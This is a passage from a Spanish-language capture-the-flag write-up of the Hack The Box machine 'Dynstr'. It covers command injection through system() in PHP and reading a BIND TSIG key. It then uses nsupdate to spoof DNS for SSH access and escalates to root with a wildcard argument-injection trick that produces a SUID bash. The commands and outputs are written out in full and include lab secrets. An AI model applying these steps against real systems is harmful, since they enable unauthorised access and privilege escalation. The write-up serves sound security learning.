<span class="mtk1">      </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"good </span><span class="mtk1">$myip</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">;</span>
<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"911 [nsupdate failed]</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">; </span><span class="mtk5">exit</span><span class="mtk1">;</span>
<span class="mtk1">    }</span>
<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"nochg </span><span class="mtk1">$myip</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">;</span>
<span class="mtk1">  }</span>
<span class="mtk5">?</span><span class="mtk5">&gt;</span>
</code></pre></div><p>Se está permitiendo que el usuario introduzca datos (variables <code>$cmd</code>, <code>$h</code>) en un comando de <code>system()</code> sin ninguna validación, por lo que los comandos inyectados se ejecutan.</p><h2 id="enumeración-del-sistema">Enumeración del sistema</h2><p>Existen tres usuarios relevantes a considerar:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@dynstr:/var/www/html/nic$ grep sh$ /etc/passwd  
root:x:0:0:root:/root:/bin/bash
dyna:x:1000:1000:dyna,,,:/home/dyna:/bin/bash
bindmgr:x:1001:1001::/home/bindmgr:/bin/bash
</code></pre></div><p>Podemos listar los contenidos del directorio <code>/home/bindmgr</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@dynstr:/tmp$ ls -la /home/bindmgr/
total 36
drwxr-xr-x 5 bindmgr bindmgr 4096 Mar 15 20:39 .
drwxr-xr-x 4 root    root    4096 Mar 15 20:26 ..
lrwxrwxrwx 1 bindmgr bindmgr    9 Mar 15 20:29 .bash_history -> /dev/null
-rw-r--r-- 1 bindmgr bindmgr  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 bindmgr bindmgr 3771 Feb 25  2020 .bashrc
drwx------ 2 bindmgr bindmgr 4096 Mar 13 12:09 .cache
-rw-r--r-- 1 bindmgr bindmgr  807 Feb 25  2020 .profile
drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 12:09 .ssh
drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 14:53 support-case-C62796521
-r-------- 1 bindmgr bindmgr   33 Jun 19 01:58 user.txt
www-data@dynstr:/tmp$ ls -la /home/bindmgr/.ssh/
total 24
drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 12:09 .
drwxr-xr-x 5 bindmgr bindmgr 4096 Mar 15 20:39 ..
-rw-r--r-- 1 bindmgr bindmgr  419 Mar 13 12:00 authorized_keys
-rw------- 1 bindmgr bindmgr 1823 Mar 13 11:48 id_rsa
-rw-r--r-- 1 bindmgr bindmgr  395 Mar 13 11:48 id_rsa.pub
-rw-r--r-- 1 bindmgr bindmgr  444 Mar 13 12:09 known_hosts
www-data@dynstr:/tmp$ cat /home/bindmgr/.ssh/authorized_keys
from="*.infra.dyna.htb" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen  
</code></pre></div><p>Este usuario <code>bindmgr</code> tiene un archivo <code>authorized_keys</code>. Sin embargo, para conectarnos por SSH sin proporcionar contraseña necesitamos tener una clave privada y tener nuestra dirección IP asociada a un subdominio de <code>infra.dyna.htb</code>.</p><p>Al usar <a href="https://github.com/carlospolop/PEASS-ng"><code>linpeas.sh</code></a> para enumerar, reporta que existe una clave privada potencial en <code>~/support-case-C62796521/C62796521-debugging.script</code>.</p><p>Para asociar un subdominio a nuestra dirección IP, podemos intentar usar la API de antes, pero el subdominio <code>dyna.htb</code> no está ofertado:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'http://dynadns:sndanyd@10.10.10.244/nic/update?hostname=asdf.infra.dyna.htb&myip=10.10.17.44'</span>  
911 [wrngdom: infra.dyna.htb]
</code></pre></div><p>Encontramos que existe otra clave más en <code>/etc/bind/infra.key</code> (similar a la usada en el archivo PHP anterior). Esta clave es necesaria para utilizar <code>nsupdate</code> (algunos ejemplos con <code>nsupdate</code> se pueden ver <a href="https://www.rtfm-sarl.ch/articles/using-nsupdate.html">aquí</a>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@dynstr:/var/www/html/nic$ cat /etc/bind/infra.key
key "infra-key" {
        algorithm hmac-sha256;
        secret "7qHH/eYXorN2ZNUM1dpLie5BmVstOw55LgEeacJZsao=";
};
www-data@dynstr:/var/www/html/nic$ nsupdate -k /etc/bind/infra.key
&gt; update add asdf.infra.dyna.htb 86400 A 10.10.17.44
>
&gt; update add 44.17.10.10.in-addr.arpa 86400 PTR asdf.infra.dyna.htb  
&gt; send
&gt; quit
</code></pre></div><p>Podemos verificarlo con <code>dig</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">dig</span> asdf.infra.dyna.htb @10.10.10.244

; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; asdf.infra.dyna.htb @10.10.10.244  
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 60663
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;asdf.infra.dyna.htb.             IN      A

;; ANSWER SECTION:
asdf.infra.dyna.htb.      86400   IN      A       10.10.17.44

;; Query time: 76 msec
;; SERVER: 10.10.10.244#53(10.10.10.244)
;; WHEN: ...
;; MSG SIZE  rcvd: 62
</code></pre></div><h2 id="movimiento-lateral-al-usuario-bindmgr">Movimiento lateral al usuario <code>bindmgr</code></h2><p>Y ahora podemos acceder como usuario <code>bindmgr</code>.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> -i <span class="mtku">id_rsa</span> bindmgr@10.10.10.244  
<span class="code-green">bindmgr@dynstr</span>:<span class="code-blue">~</span>$ cat user.txt
065011ea147bed677a2c49b904ef467c
</code></pre></div><p>Este usuario puede ejecutar un <em>script</em> en Bash como <code>root</code> sin proporcionar contraseña:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">bindmgr@dynstr</span>:<span class="code-blue">~</span>$ sudo -l
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
Matching Defaults entries for bindmgr on dynstr:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  

User bindmgr may run the following commands on dynstr:
    (ALL) NOPASSWD: /usr/local/bin/bindmgr.sh
<span class="code-green">bindmgr@dynstr</span>:<span class="code-blue">~</span>$ cat /usr/local/bin/bindmgr.sh
</code></pre></div><p>Este es el contenido del <em>script</em>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/bash</span>

<span class="mtk3"># This script generates named.conf.bindmgr to work</span><span class="mtk3">around the problem</span>
<span class="mtk3"># that bind/named can only include single files bu</span><span class="mtk3">t no directories.</span>
<span class="mtk3">#</span>
<span class="mtk3"># It creates a named.conf.bindmgr file in /etc/bin</span><span class="mtk3">d that can be included</span>
<span class="mtk3"># from named.conf.local (or others) and will inclu</span><span class="mtk3">de all files from the</span>
<span class="mtk3"># directory /etc/bin/named.bindmgr.</span>
<span class="mtk3">#</span>
<span class="mtk3"># NOTE: The script is work in progress. For now bi</span><span class="mtk3">nd is not including</span>
<span class="mtk3">#       named.conf.bindmgr.</span>
<span class="mtk3">#</span>
<span class="mtk3"># TODO: Currently the script is only adding files </span><span class="mtk3">to the directory but</span>
<span class="mtk3">#       not deleting them. As we generate the list</span><span class="mtk3"> of files to be included</span>
<span class="mtk3">#       from the source directory they won't be in</span><span class="mtk3">cluded anyway.</span>

<span class="mtk1">BINDMGR_CONF=/etc/bind/named.conf.bindmgr</span>
<span class="mtk1">BINDMGR_DIR=/etc/bind/named.bindmgr</span>

<span class="mtk8">indent</span><span class="mtk1">() { sed </span><span class="mtk4">'s/^/    /'</span><span class="mtk5">;</span><span class="mtk1"> }</span>

<span class="mtk3"># Check versioning (.version)</span>
<span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"[+] Running </span><span class="mtk1">$0</span><span class="mtk4"> to stage new configuration from </span><span class="mtk1">$PWD</span><span class="mtk4">."</span>
<span class="mtk5">if</span><span class="mtk1"> [[ </span><span class="mtk5">!</span><span class="mtk1"> </span><span class="mtk5">-f</span><span class="mtk1"> .version ]] </span><span class="mtk5">;</span><span class="mtk1"> </span><span class="mtk5">then</span>
<span class="mtk1">    </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"[-] ERROR: Check versioning. Exiting."</span>
<span class="mtk1">    </span><span class="mtk7">exit</span><span class="mtk1"> 42</span>
<span class="mtk5">fi</span>
<span class="mtk5">if</span><span class="mtk1"> [[ </span><span class="mtk4">"`cat .version </span><span class="mtk5">2&gt;</span><span class="mtk4">/dev/null`"</span><span class="mtk1"> </span><span class="mtk5">-le</span><span class="mtk1"> </span><span class="mtk4">"`cat </span><span class="mtk1">$BINDMGR_DIR</span><span class="mtk4">/.version </span><span class="mtk5">2&gt;</span><span class="mtk4">/dev/null`"</span><span class="mtk1"> ]] </span><span class="mtk5">;</span><span class="mtk1"> </span><span class="mtk5">then</span>  
<span class="mtk1">    </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"[-] ERROR: Check versioning. Exiting."</span>
<span class="mtk1">    </span><span class="mtk7">exit</span><span class="mtk1"> 43</span>
<span class="mtk5">fi</span>

<span class="mtk3"># Create config file that includes all files from </span><span class="mtk3">named.bindmgr.</span>
<span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"[+] Creating </span><span class="mtk1">$BINDMGR_CONF</span><span class="mtk4"> file."</span>
<span class="mtk7">printf</span><span class="mtk1"> </span><span class="mtk4">'// Automatically generated file. Do not modify ma</span><span class="mtk4">nually.\n'</span><span class="mtk1"> </span><span class="mtk5">&gt;</span><span class="mtk1"> $BINDMGR_CONF</span>
<span class="mtk5">for</span><span class="mtk1"> file </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk5">;</span><span class="mtk1"> </span><span class="mtk5">do</span>
<span class="mtk1">    </span><span class="mtk7">printf</span><span class="mtk1"> </span><span class="mtk4">'include "/etc/bind/named.bindmgr/%s";\n'</span><span class="mtk1"> </span><span class="mtk4">"</span><span class="mtk1">$file</span><span class="mtk4">"</span><span class="mtk1"> </span><span class="mtk5">&gt;&gt;</span><span class="mtk1"> $BINDMGR_CONF</span>
<span class="mtk5">done</span>

<span class="mtk3"># Stage new version of configuration files.</span>
<span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"[+] Staging files to </span><span class="mtk1">$BINDMGR_DIR</span><span class="mtk4">."</span>
<span class="mtk1">cp .version </span><span class="mtk5">*</span><span class="mtk1"> /etc/bind/named.bindmgr/</span>

<span class="mtk3"># Check generated configuration with named-checkco</span><span class="mtk3">nf.</span>
<span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"[+] Checking staged configuration."</span>
<span class="mtk1">named-checkconf $BINDMGR_CONF </span><span class="mtk5">&gt;</span><span class="mtk1">/dev/null</span>
<span class="mtk5">if</span><span class="mtk1"> [[ $? </span><span class="mtk5">-ne</span><span class="mtk1"> 0 ]] </span><span class="mtk5">;</span><span class="mtk1"> </span><span class="mtk5">then</span>
<span class="mtk1">    </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"[-] ERROR: The generated configuration is not val</span><span class="mtk4">id. Please fix following errors: "</span><span class="mtk1"> </span>
<span class="mtk1">    named-checkconf $BINDMGR_CONF </span><span class="mtk5">2&gt;&amp;1</span><span class="mtk1"> </span><span class="mtk5">|</span><span class="mtk1"> indent</span>
<span class="mtk1">    </span><span class="mtk7">exit</span><span class="mtk1"> 44</span>
<span class="mtk5">else</span>
<span class="mtk1">    </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"[+] Configuration successfully staged."</span>
<span class="mtk1">    </span><span class="mtk3"># *** TODO *** Uncomment restart once we are live.</span>
<span class="mtk1">    </span><span class="mtk3"># systemctl restart bind9</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> [[ $? </span><span class="mtk5">-ne</span><span class="mtk1"> 0 ]] </span><span class="mtk5">;</span><span class="mtk1"> </span><span class="mtk5">then</span>
<span class="mtk1">        </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"[-] Restart of bind9 via systemctl failed. Please</span><span class="mtk4"> check logfile: "</span>
<span class="mtk1">        systemctl status bind9</span>
<span class="mtk1">    </span><span class="mtk5">else</span>
<span class="mtk1">        </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"[+] Restart of bind9 via systemctl succeeded."</span>
<span class="mtk1">    </span><span class="mtk5">fi</span>
<span class="mtk5">fi</span>
</code></pre></div><h2 id="escalada-de-privilegios">Escalada de privilegios</h2><p>El punto clave de este <em>script</em> es el siguiente:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">cp .version </span><span class="mtk5">*</span><span class="mtk1"> /etc/bind/named.bindmgr/</span>  
</code></pre></div><p>La idea es copiar el binario <code>bash</code> a <code>/tmp</code>, cambiar su modo a SUID y después utilizar <code>cp --preserve=mode</code> de manera que es copiado por <code>root</code> en el directorio <code>/etc/bind/named.bindmgr</code> como SUID.</p><p>El uso de una <em>wildcard</em> (<code>*</code>) nos permite crear un archivo que lleve el nombre de <code>'--preserve=mode'</code> para que sea utilizado por el comando <code>cp</code>, pero no como archivo sino como parámetro.</p><p>Aquí se muestra el proceso (se necesita un archivo <code>.version</code> para pasar las dos primeras sentencias <code>if</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">bindmgr@dynstr</span>:<span class="code-blue">~</span>$ cd /tmp
<span class="code-green">bindmgr@dynstr</span>:<span class="code-blue">/tmp</span>$ echo '2' &gt; .version
<span class="code-green">bindmgr@dynstr</span>:<span class="code-blue">/tmp</span>$ cp $(which bash) .
<span class="code-green">bindmgr@dynstr</span>:<span class="code-blue">/tmp</span>$ chmod 4755 bash
<span class="code-green">bindmgr@dynstr</span>:<span class="code-blue">/tmp</span>$ echo &gt; --preserve=mode
<span class="code-green">bindmgr@dynstr</span>:<span class="code-blue">/tmp</span>$ ls -la | grep bindmgr
-rwsr-xr-x  1 <span class="code-red">bindmgr</span> <span class="code-red">bindmgr</span> 1183448 Jul 17 16:56 bash
-rw-rw-r--  1 <span class="code-red">bindmgr</span> <span class="code-red">bindmgr</span>       1 Jul 17 16:56 --preserve=mode
-rw-rw-r--  1 <span class="code-red">bindmgr</span> <span class="code-red">bindmgr</span>       2 Jul 17 16:56 .version
<span class="code-green">bindmgr@dynstr</span>:<span class="code-blue">/tmp</span>$ sudo /usr/local/bin/bindmgr.sh
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
[+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /tmp.
[+] Creating /etc/bind/named.conf.bindmgr file.
[+] Staging files to /etc/bind/named.bindmgr.
cp: -r not specified; omitting directory 'systemd-private-3676061894b9497587b13254f655c27f-apache2.service-z1Nejh'
cp: -r not specified; omitting directory 'systemd-private-3676061894b9497587b13254f655c27f-systemd-logind.service-Hse6sg'
cp: -r not specified; omitting directory 'systemd-private-3676061894b9497587b13254f655c27f-systemd-resolved.service-r4Vptf'
cp: -r not specified; omitting directory 'systemd-private-3676061894b9497587b13254f655c27f-systemd-timesyncd.service-omMmHi'  
cp: -r not specified; omitting directory 'vmware-root_495-2126330929'
[+] Checking staged configuration.
[-] ERROR: The generated configuration is not valid. Please fix following errors:
    /etc/bind/named.bindmgr/bash:1: unknown option 'ELF...'
    /etc/bind/named.bindmgr/bash:14: unknown option 'hȀE'
    /etc/bind/named.bindmgr/bash:40: unknown option 'YF'
    /etc/bind/named.bindmgr/bash:40: unexpected token near '}'
</code></pre></div><p>Y ahora tenemos <code>bash</code> como binario SUID, por lo que podemos ejecutarlo como <code>root</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">bindmgr@dynstr</span>:<span class="code-blue">/tmp</span>$ ls -la /etc/bind/named.bindmgr/  
total 1168
drwxr-sr-x 2 root bind    4096 Jul 17 16:56 <span class="code-blue">.</span>
drwxr-sr-x 3 root bind    4096 Jul 17 16:56 <span class="code-blue">..</span>
-rwsr-xr-x 1 root bind 1183448 Jul 17 16:56 <span class="code-white code-bg-red">bash</span>
-rw-rw-r-- 1 root bind       2 Jul 17 16:56 .version
<span class="code-green">bindmgr@dynstr</span>:<span class="code-blue">/tmp</span>$ /etc/bind/named.bindmgr/bash -p
bash-5.0# cat /root/root.txt
a098dde8b9b9849be538b1de060156a2
</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#información-general">Información general</a></li><li><a href="#exploración-del-dns">Exploración del DNS</a></li><li><a href="#intrusión-en-la-máquina">Intrusión en la máquina</a></li><li><a href="#enumeración-del-sistema">Enumeración del sistema</a></li><li><a href="#movimiento-lateral-al-usuario-bindmgr">Movimiento lateral al usuario <code>bindmgr</code></a></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit='return window.open("https://tinyletter.com/7Rocky","popupwindow","scrollbars=yes,width=800,height=600"),!0'><h3 class="tc">Recibe un resumen semanal del blog</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Introduce tu correo electrónico" name="email" id="tlemail">
<input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Submit"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc">impulsado por <a href="https://tinyletter.com" target="_blank" title="TinyLetter">TinyLetter</a></p><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2023</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>